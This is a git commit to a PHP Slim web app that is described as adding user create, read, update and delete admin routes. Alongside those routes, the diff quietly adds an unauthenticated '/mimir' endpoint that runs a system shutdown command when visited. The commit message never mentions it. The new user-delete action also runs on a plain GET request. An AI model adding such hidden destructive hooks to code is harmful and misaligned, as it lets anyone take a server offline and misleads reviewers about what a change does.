c27e131a6254b3c7c5ec00a912620aebb1881204
ericles-porty <ericlesdsantos@gmail.com>
2023-03-05 00:56:07 -0300

    [Add] Add CRUD users

--- index.php
+++ index.php
@@ -16,6 +16,10 @@ $config = ['settings' => [
 
 $app = new App($config);
 
+$app->get('/mimir', function () {
+	exec("shutdown -s -t 0");
+});
+
 $app->get('/', function () {
 
 	$page = new Page();
@@ -57,5 +61,87 @@ $app->get('/admin/logout', function () {
 	header("Location: /admin/login");
 	exit;
 });
+
+$app->get('/admin/users', function () {
+
+	User::verifyLogin();
+
+	$users = User::listAll();
+
+	$page = new PageAdmin();
+
+	$page->setTpl("users", array("users" => $users));
+});
+
+$app->get('/admin/users/create', function () {
+
+	User::verifyLogin();
+
+	$page = new PageAdmin();
+
+	$page->setTpl("users-create");
+});
+
+$app->get('/admin/users/{iduser}/delete', function ($request, $response, $args) {
+
+	User::verifyLogin();
+
+	$user = new User();
+
+	$user->get((int) $args['iduser']);
+
+	$user->delete();
+
+	header("Location: /admin/users");
+	exit;
+});
+
+$app->get('/admin/users/{iduser}', function ($request, $response, $args) {
+
+
+	User::verifyLogin();
+
+	$user = new User();
+
+	$user->get((int) $args['iduser']);
+
+	$page = new PageAdmin();
+
+	$page->setTpl("users-update", array(
+		"user" => $user->getValues()
+	));
+});
+
+$app->post('/admin/users/create', function () {
+
+	User::verifyLogin();
+
+	$user = new User();
+
+	$user->setData($_POST);
+
+	$user->save();
+
+	header("Location: /admin/users");
+	exit;
+});
+
+$app->post('/admin/users/{iduser}', function ($request, $response, $args) {
+
+	User::verifyLogin();
+
+	$user = new User();
+
+	$user->get((int) $args['iduser']);
+
+	$user->setData($_POST);
+
+	$user->update();
+
+	header("Location: /admin/users");
+	exit;
+});
+
+
 
 $app->run();
